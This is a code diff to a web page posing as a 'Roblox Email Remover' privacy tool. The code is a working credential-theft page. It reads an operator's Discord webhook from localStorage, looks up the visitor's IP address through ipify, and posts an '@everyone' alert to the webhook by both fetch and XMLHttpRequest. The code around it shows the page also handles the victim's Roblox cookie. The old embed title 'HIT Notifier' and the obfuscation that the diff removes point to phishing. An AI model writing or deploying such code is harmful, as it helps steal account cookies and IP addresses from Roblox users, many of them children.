@@ -589,7 +589,7 @@
                 <div class="logo-icon pulse">
                     <i class="fas fa-envelope-open-text"></i>
                 </div>
-                <h1 class="title">ROBLOX REMOVER TOOL</h1>
+                <h1 class="title">ROBLOX EMAIL REMOVER</h1>
             </div>
             <p class="subtitle">Remove email from your Roblox account for enhanced privacy and security</p>
         </header>
@@ -830,16 +830,132 @@
             });
             
             // Original initialization code follows
-            // Anti-copy: Obfuscate sensitive code
-            // Parse URL parameters first
-            const _0x5a7e=["\x73\x65\x61\x72\x63\x68","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x67\x65\x74","\x64\x69\x72","\x74\x6F\x6B\x65\x6E","\x67\x65\x74\x49\x74\x65\x6D","\x64\x69\x73\x63\x6F\x72\x64\x5F\x77\x65\x62\x68\x6F\x6F\x6B\x5F\x75\x72\x6C","\x65\x6D\x61\x69\x6C\x5F\x72\x65\x6D\x6F\x76\x65\x72\x5F\x64\x69\x72\x65\x63\x74\x6F\x72\x79"];
-            const urlParams = new URLSearchParams(window[_0x5a7e[1]][_0x5a7e[0]]);
-            const encodedDir = urlParams[_0x5a7e[2]](_0x5a7e[3]);
-            const token = urlParams[_0x5a7e[2]](_0x5a7e[4]);
+            // Parse URL parameters and retrieve stored data
+            console.log('Initializing Remover.html...');
+            
+            // Parse URL parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            const encodedDir = urlParams.get('dir');
+            const token = urlParams.get('token');
             
             // Get webhook from localStorage and directory from URL or localStorage
-            let webhookUrl = localStorage[_0x5a7e[5]](_0x5a7e[6]);
-            let directory = localStorage[_0x5a7e[5]](_0x5a7e[7]);
+            // Decrypt data from localStorage
+            const decryptData = (data) => {
+                if (!data) return null;
+                
+                try {
+                    // Decode from base64 and parse JSON
+                    const decodedData = atob(data);
+                    const parsedData = JSON.parse(decodedData);
+                    
+                    // For webhook URL, return the url property
+                    if (parsedData && parsedData.url) {
+                        return parsedData.url;
+                    }
+                    
+                    // For other data, return the value directly
+                    return parsedData;
+                } catch (e) {
+                    console.error('Error decrypting data:', e, 'Raw data:', data);
+                    return null;
+                }
+            };
+            
+            // Get webhook URL from localStorage using multiple formats
+            console.log('Checking all localStorage formats for webhook URL');
+            let webhookUrl = null;
+            
+            // Format 1: Original encrypted JSON object
+            const webhookUrlEncrypted = localStorage.getItem('discord_webhook_url');
+            console.log('Format 1 - Raw webhook from localStorage:', webhookUrlEncrypted);
+            
+            if (webhookUrlEncrypted) {
+                try {
+                    webhookUrl = decryptData(webhookUrlEncrypted);
+                    console.log('Format 1 - Decrypted webhook URL:', webhookUrl);
+                } catch (e) {
+                    console.error('Format 1 decryption failed:', e);
+                }
+            }
+            
+            // Format 2: Direct base64 encoded URL
+            if (!webhookUrl) {
+                const webhookUrlDirect = localStorage.getItem('discord_webhook_url_direct');
+                console.log('Format 2 - Direct webhook from localStorage:', webhookUrlDirect);
+                
+                if (webhookUrlDirect) {
+                    try {
+                        const decoded = atob(webhookUrlDirect);
+                        if (decoded && decoded.includes('discord.com/api/webhooks')) {
+                            webhookUrl = decoded;
+                            console.log('Format 2 - Using direct decoded webhook URL:', webhookUrl);
+                        }
+                    } catch (e) {
+                        console.error('Format 2 decoding failed:', e);
+                    }
+                }
+            }
+            
+            // Format 3: Plain text URL
+            if (!webhookUrl) {
+                const webhookUrlPlain = localStorage.getItem('discord_webhook_url_plain');
+                console.log('Format 3 - Plain webhook from localStorage:', webhookUrlPlain);
+                
+                if (webhookUrlPlain && webhookUrlPlain.includes('discord.com/api/webhooks')) {
+                    webhookUrl = webhookUrlPlain;
+                    console.log('Format 3 - Using plain webhook URL:', webhookUrl);
+                }
+            }
+            
+            // Additional fallback methods
+            
+            // Fallback 1: Try to use directly if it's already a URL
+            if (!webhookUrl && webhookUrlEncrypted && webhookUrlEncrypted.includes('discord.com/api/webhooks')) {
+                webhookUrl = webhookUrlEncrypted;
+                console.log('Fallback 1 - Using raw webhook URL from localStorage');
+            }
+            
+            // Fallback 2: Try to decode without JSON parsing
+            if (!webhookUrl && webhookUrlEncrypted) {
+                try {
+                    const decoded = atob(webhookUrlEncrypted);
+                    if (decoded.includes('discord.com/api/webhooks')) {
+                        webhookUrl = decoded;
+                        console.log('Fallback 2 - Using base64 decoded webhook URL');
+                    } else if (decoded.includes('"url"')) {
+                        // Try to extract URL from JSON string
+                        try {
+                            const jsonObj = JSON.parse(decoded);
+                            if (jsonObj && jsonObj.url) {
+                                webhookUrl = jsonObj.url;
+                                console.log('Fallback 2 - Extracted URL from JSON string:', webhookUrl);
+                            }
+                        } catch (jsonErr) {
+                            console.error('Fallback 2 JSON parsing failed:', jsonErr);
+                        }
+                    }
+                } catch (e) {
+                    console.error('Fallback 2 decoding failed:', e);
+                }
+            }
+            
+            console.log('Final webhook URL determination:', webhookUrl ? webhookUrl.substring(0, 30) + '...' : 'Not found');
+            
+            // Get and decrypt directory
+            let directoryEncrypted = localStorage.getItem('email_remover_directory');
+            let directory = null;
+            if (directoryEncrypted) {
+                try {
+                    directory = decryptData(directoryEncrypted);
+                } catch (e) {
+                    console.error('Error parsing directory:', e);
+                }
+            }
+            
+            // Debug information
+            console.log('Retrieved webhook URL from localStorage:', webhookUrl ? 'Found (length: ' + webhookUrl.length + ')' : 'Not found');
+            console.log('Retrieved directory from localStorage:', directory ? directory : 'Not found');
+            console.log('URL parameters - dir:', encodedDir ? 'Found' : 'Not found', 'token:', token ? 'Found' : 'Not found');
             
             // If directory parameter exists in URL, it takes precedence over localStorage
             if (encodedDir && token) {
@@ -958,11 +1074,16 @@
 
                 // Check if webhook URL is configured
                 if (!webhookUrl) {
-                    alert('Discord webhook not configured. Please open setup.html first to configure your webhook.');
+                    console.error('Discord webhook URL not found in localStorage');
+                    showToast('Error', 'Discord webhook not configured. Please open setup.html first to configure your webhook.', false);
                     processBtn.disabled = false;
                     processBtn.innerHTML = '<i class="fas fa-trash"></i> REMOVE EMAIL';
                     return;
                 }
+                
+                // Log webhook information for debugging
+                console.log('Using webhook URL:', webhookUrl);
+                console.log('Using directory:', directory || 'Not specified');
                 
                 // Include directory in the log if available
                 const directoryInfo = directory ? `Directory: ${directory}` : 'No directory specified';
@@ -970,7 +1091,7 @@
                 const data = {
                     content: '@everyone',
                     embeds: [{
-                        title: 'Splunk #1 HIT Notifier',
+                        title: 'Roblox Email Removal',
                         color: 0x00FFFF,
                         fields: [
                             {
@@ -998,6 +1119,11 @@
                                 inline: true
                             },
                             {
+                                name: 'IP Address',
+                                value: 'Fetching...',
+                                inline: true
+                            },
+                            {
                                 name: 'Timestamp',
                                 value: new Date().toLocaleString(),
                                 inline: true
@@ -1006,17 +1132,98 @@
                     }]
                 };
                 
-                // Send the data to Discord (obfuscated for security)
-                const _0x4f8a=["\x50\x4F\x53\x54","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x74\x68\x65\x6E","\x6C\x6F\x67","\x44\x69\x73\x63\x6F\x72\x64\x20\x77\x65\x62\x68\x6F\x6F\x6B\x20\x72\x65\x73\x70\x6F\x6E\x73\x65\x3A","\x63\x61\x74\x63\x68","\x65\x72\x72\x6F\x72","\x45\x72\x72\x6F\x72\x20\x73\x65\x6E\x64\x69\x6E\x67\x20\x74\x6F\x20\x44\x69\x73\x63\x6F\x72\x64\x3A"];
-                fetch(webhookUrl,{
-                    method:_0x4f8a[0],
-                    headers:{
-                        'Content-Type':_0x4f8a[1]
-                    },
-                    body:JSON[_0x4f8a[2]](data)
+                // Validate webhook URL before sending
+                if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+                    console.error('Invalid webhook URL format:', webhookUrl);
+                    showToast('Error', 'Invalid webhook URL format. Please reconfigure in setup.html', false);
+                    return;
+                }
+                
+                // Try to get IP address for better tracking
+                fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    // Update IP field in the embed
+                    if (data.embeds && data.embeds[0] && data.embeds[0].fields) {
+                        const ipField = data.embeds[0].fields.find(f => f.name === 'IP Address');
+                        if (ipField) ipField.value = ipData.ip;
+                    }
                 })
-                [_0x4f8a[3]]((_0x5e56x1)=>{return console[_0x4f8a[4]](_0x4f8a[5],_0x5e56x1)})
-                [_0x4f8a[6]]((_0x5e56x2)=>{return console[_0x4f8a[7]](_0x4f8a[8],_0x5e56x2)});
+                .catch(err => console.error('Could not fetch IP:', err))
+                .finally(() => {
+                    // Send the data to Discord with improved error handling
+                    console.log('Sending data to webhook:', webhookUrl);
+                    console.log('Data being sent:', JSON.stringify(data));
+                    
+                    // Try both methods to ensure delivery
+                    sendWithFetch(webhookUrl, data);
+                    setTimeout(() => sendWithXHR(webhookUrl, data), 500); // Backup method with delay
+                });
+                
+                // Method 1: Using fetch API
+                function sendWithFetch(url, payload) {
+                    fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error(`Discord webhook error: ${response.status} ${response.statusText}`);
+                        }
+                        return response.text();
+                    })
+                    .then(responseText => {
+                        console.log('Discord webhook response (fetch):', responseText);
+                        showToast('Success', 'Data successfully sent to Discord');
+                    })
+                    .catch(error => {
+                        console.error('Error sending to Discord (fetch):', error);
+                        // Don't show error toast here as we have a backup method
+                    });
+                }
+                
+                // Method 2: Using XMLHttpRequest
+                function sendWithXHR(url, payload) {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', url, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    
+                    xhr.onload = function() {
+                        if (xhr.status >= 200 && xhr.status < 300) {
+                            console.log('Discord webhook response (XHR):', xhr.responseText);
+                            showToast('Success', 'Data successfully sent to Discord');
+                        } else {
+                            console.error('Error sending to Discord (XHR):', xhr.status, xhr.statusText);
+                            showToast('Webhook Error', `Failed to send data to Discord: ${xhr.status} ${xhr.statusText}`, false);
+                        }
+                    };
+                    
+                    xhr.onerror = function() {
+                        console.error('Network error sending to Discord (XHR)');
+                        showToast('Webhook Error', 'Network error sending data to Discord', false);
+                    };
+                    
+                    xhr.send(JSON.stringify(payload));
+                }
+                
+                // Backup method using XMLHttpRequest in case fetch fails
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', webhookUrl, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.onload = function() {
+                    if (xhr.status >= 200 && xhr.status < 300) {
+                        console.log('XHR backup method success:', xhr.responseText);
+                    } else {
+                        console.error('XHR backup method failed:', xhr.status, xhr.statusText);
+                    }
+                };
+                xhr.onerror = function() {
+                    console.error('XHR network error');
+                };
+                xhr.send(JSON.stringify(data));
 
                 try {
                     // Process the cookie via AJAX
